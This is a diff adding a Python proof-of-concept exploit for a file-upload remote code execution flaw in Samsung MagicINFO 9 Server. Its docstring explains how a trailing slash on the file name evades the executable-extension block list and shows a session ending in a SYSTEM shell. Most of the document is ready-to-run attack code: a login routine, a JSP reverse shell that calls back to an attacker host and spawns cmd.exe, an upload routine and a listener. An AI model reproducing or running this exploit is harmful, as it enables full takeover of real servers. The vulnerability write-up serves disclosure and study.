@@ -1,0 +1,249 @@
+#!/usr/bin/env python3
+"""
+Samsung MagicINFO 9 Server ContentSaveServiceImpl getMediaSourceFromNewFile File Upload Remote Code Execution Vulnerability
+Download: https://www.magicinfoservices.com/magicinfo-software?submissionGuid=4163dba5-9096-43b4-9ca0-27696e8b70b8
+File: MagicInfo 9 Server 21.1080.0 Setup.zip
+Release date: 5/8/2025
+CVSS: 8.8 (/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+SHA1: 9744711fe76e7531f128835bf83c9ae001069115
+Install guide: https://docs.samsungvx.com/docs/pages/viewpage.action?pageId=60034270
+Found by: Steven Seeley of Source Incite
+
+# Summary
+
+A low privileged user (any user) can upload a backdoor and gain remote code execution against the system. Note that the authentication mechanism can be bypassed by chaining other vulnerabilities
+
+# Analysis
+
+The problem arises because we can bypass all of the protections inside of the `com.samsung.magicinfo.webauthor2.service.ContentSaveServiceImpl` class
+
+```java
+/*     */   public MediaSource getMediaSourceFromNewFile(NewFileInfo fileItemsDescriptor) throws IOException {
+/* 130 */     String errorMessage = null;
+/* 131 */     errorMessage = this.multipartFilenameValidator.validateNameForContents(fileItemsDescriptor.getMediaSource().getFileName()); // 1
+/* 132 */     if (!Strings.isNullOrEmpty(errorMessage))
+/*     */     {
+/* 134 */       throw new FileItemValidationException(500, errorMessage);
+/*     */     }
+/*     */     
+/* 137 */     String message = this.multipartFilenameValidator.validateName(fileItemsDescriptor.getMediaSource().getFileName()); // 2
+/*     */     
+/* 139 */     if (!Strings.isNullOrEmpty(message)) {
+/* 140 */       throw new FileItemValidationException(500, message);
+/*     */     }
+/*     */     
+/* 143 */     Path filePath = Paths.get(this.servletContext.getRealPath("insertContents"), new String[] { fileItemsDescriptor.getMediaSource().getFileName() }); // 3
+/*     */ 
+/*     */ 
+/*     */     
+/* 147 */     if (!CleanPreviewFolder.isPathValid(String.valueOf(filePath))) { // 3
+/* 148 */       throw new FileItemValidationException("InvalidFilePathError");
+/*     */     }
+/*     */     
+/* 151 */     if (Files.exists(filePath, new java.nio.file.LinkOption[0])) {
+/* 152 */       FileUtils.deleteQuietly(filePath.toFile());
+/*     */     }
+/*     */     try {
+/* 155 */       FileUtils.writeStringToFile(filePath.toFile(), fileItemsDescriptor.getFileData(), StandardCharsets.UTF_8);
+/* 156 */     } catch (IOException ex) {
+/* 157 */       Logger.getLogger(ContentSaveServiceImpl.class.getName()).log(Level.SEVERE, null, ex);
+/*     */     } 
+/* 159 */     MediaSource mediaSource = this.uploadHelperService.getDetailsFromFile(filePath);
+/* 160 */     mediaSource.setIsNew(true);
+/* 161 */     mediaSource.setData("insertContents/" + fileItemsDescriptor.getMediaSource().getFileName());
+/*     */     
+/* 163 */     return mediaSource;
+/*     */   }
+```
+
+```java
+/*     */   public String validateNameForContents(String name) {
+/* 154 */     String issue = null;
+/* 155 */     if (this.fileNameValidator.filenameContainsSpecialCharacters(name)) {
+/* 156 */       issue = "SpecialCharFileName";
+/*     */     }
+/* 158 */     if (this.fileNameValidator.filenameHasExecutableType(name)) {
+/* 159 */       issue = "InvalidFileType [" + FilenameUtils.getExtension(name) + "]";
+/*     */     }
+/* 161 */     return issue;
+/*     */   }
+```
+
+```java
+/*    */   public boolean filenameContainsSpecialCharacters(String filename) {
+/* 25 */     if (!Pattern.matches("^[^\\\\{}&^%#$,\"|:'']+$", filename))
+/* 26 */       return true; 
+/* 27 */     if (filename.contains("../"))
+/* 28 */       return true; 
+/* 29 */     return false;
+/*    */   }
+```
+
+```
+/* 20 */   private static final List<String> EXECUTABLE_EXTENSIONS = Arrays.asList(new String[] { "exe", "bat", "sh", "jsp", "jspx", "asp", "php", "mht", "ps1", "vbs", "dll", "php5", "pht", "phtml", "shtml", "asa", "asax", "swf", "xap", "cmd", "bin", "com", "cpl", "gadget", "inf1", "ins", "inx", "isu", "job", "jse", "lnk", "msc", "msi", "msp", "mst", "paf", "pif", "reg", "rgs", "scr", "sct", "shb", "shs", "u3p", "vb", "vbe", "vbscript", "ws", "wsf", "wsh" });
+/*    */   
+/*    */   public boolean filenameHasExecutableType(String filename) {
+/* 43 */     String extension = FilenameUtils.getExtension(filename).toLowerCase();
+/* 44 */     return EXECUTABLE_EXTENSIONS.contains(extension);
+/*    */   }
+```
+
+At [1], [2] there is heavy filtering occurring, but the Samsung developers forgot about one little edge case. If the attacker adds a forward slash on the end of the filename, then we bypass all of the checks, especially the `filenameHasExecutableType` method! 
+At [3] the code calls `Paths.get` with the attacker controlled filename ending in a forward slash, this api returns the constructed path without the ending slash! HooHAR!
+
+# Proof of Concept
+
+I'm just to lazy these days to chain with the auth bypasses:
+
+```
+researcher@universe:~/0d$ ./poc.py
+(+) usage: ./poc.py <target> <usr:pwd> <connectback>
+(+) eg: ./poc.py 192.168.18.136 lowpriv:mypassword1 192.168.18.137
+researcher@universe:~/0d$ ./poc.py 192.168.18.136 lowpriv:mypassword1 172.20.210.49
+(+) grabbed the token: JDBiYzQ0YmZjZGM3MjkzNDEkdA==
+(+) shell at: YWnfIcwF.jsp
+(+) starting handler on port 1337
+(+) going for it...!
+(+) connection from 172.20.208.1
+(+) pop thy shell!
+Microsoft Windows [Version 10.0.17763.7558]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\MagicInfo Premium\tomcat\bin>whoami
+whoami
+nt authority\system
+
+C:\MagicInfo Premium\tomcat\bin>
+```
+"""
+import sys
+import urllib3
+import socket
+import random
+import string
+import requests
+from threading import Thread
+from telnetlib import Telnet
+from colorama import Fore, Style
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def generate_random_string(length):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+# only need a low priv user here
+def token_grab(t, usr, pwd):
+    uri = f"https://{t}:7002/MagicInfoWebAuthorClient/main"
+    p = {
+        "username": usr,
+        "password": pwd,
+    }
+    r = requests.post(uri, params=p, headers={"accept":"application/json"}, verify=False)
+    t = r.json()['token']
+    assert t, "(-) unable to login and grab the token!"
+    return t
+
+def get_jsp(ls, lp):
+    jsp = f"""<%@page import="java.lang.*"%>
+<%@page import="java.util.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+<%
+  class StreamConnector extends Thread
+  {{
+    InputStream sv;
+    OutputStream tp;
+    StreamConnector( InputStream sv, OutputStream tp )
+    {{
+      this.sv = sv;
+      this.tp = tp;
+    }}
+    public void run()
+    {{
+      BufferedReader za  = null;
+      BufferedWriter hjr = null;
+      try
+      {{
+        za  = new BufferedReader( new InputStreamReader( this.sv ) );
+        hjr = new BufferedWriter( new OutputStreamWriter( this.tp ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = za.read( buffer, 0, buffer.length ) ) > 0 )
+        {{
+          hjr.write( buffer, 0, length );
+          hjr.flush();
+        }}
+      }} catch( Exception e ){{}}
+      try
+      {{
+        if( za != null )
+          za.close();
+        if( hjr != null )
+          hjr.close();
+      }} catch( Exception e ){{}}
+    }}
+  }}
+  try
+  {{
+    String ShellPath = new String("cmd.exe");
+    Socket socket = new Socket("{ls}", {lp});
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  }} catch( Exception e ) {{}}
+%>"""
+    return jsp
+
+def ZDI_25_655_bypass(t, tkn, jspcode):
+    s = generate_random_string(8)
+    uri = f"https://{t}:7002/MagicInfoWebAuthorClient/save/newFile"
+    j = {
+        "newFileData": jspcode,
+        "newMediaSource": {
+            "data": "1337",
+            "fileId": 1337,
+            "fileName": f"{s}.jsp/"
+        }
+    }
+    r = requests.post(uri, json=j, headers={"accept":"application/json", "cookie":f";test={tkn}"}, verify=False)
+    assert r.json(), "(-) upload failed!"
+    return s
+
+def handler(lp):
+    print(f"(+) starting handler on port {lp}")
+    t = Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"(+) connection from {addr[0]}")
+    t.sock = conn
+    print(f"(+) {Fore.RED + Style.BRIGHT}pop thy shell!{Style.RESET_ALL}")
+    t.interact()
+
+def main():
+    if len(sys.argv) != 4:
+        print("(+) usage: %s <target> <usr:pwd> <connectback>" % sys.argv[0])
+        print("(+) eg: %s 192.168.18.136 lowpriv:mypassword1 192.168.18.137" % sys.argv[0])
+        sys.exit(1)
+    t = sys.argv[1]
+    c = sys.argv[2]
+    assert ":" in sys.argv[2], "(-) user credentials are not in the proper format"
+    usr, pwd = sys.argv[2].split(":")
+    h = sys.argv[3]
+    p = 1337
+    if ":" in sys.argv[3]:
+        p = int(sys.argv[3].split(":")[1])
+        h = sys.argv[3].split(":")[0]
+    shellcode = get_jsp(h, p)
+    tkn = token_grab(t, usr, pwd)
+    print(f"(+) grabbed the token: {tkn}")
+    s = ZDI_25_655_bypass(t, tkn, shellcode)
+    print(f"(+) shell at: {s}.jsp")
+    handlerthr2 = Thread(target=handler, args=[p])
+    handlerthr2.start()
+    print("(+) going for it...!")
+    requests.get(f"https://{t}:7002/MagicInfoWebAuthorClient/insertContents/{s}.jsp", verify=False)
+
+if __name__ == "__main__":
+    main()
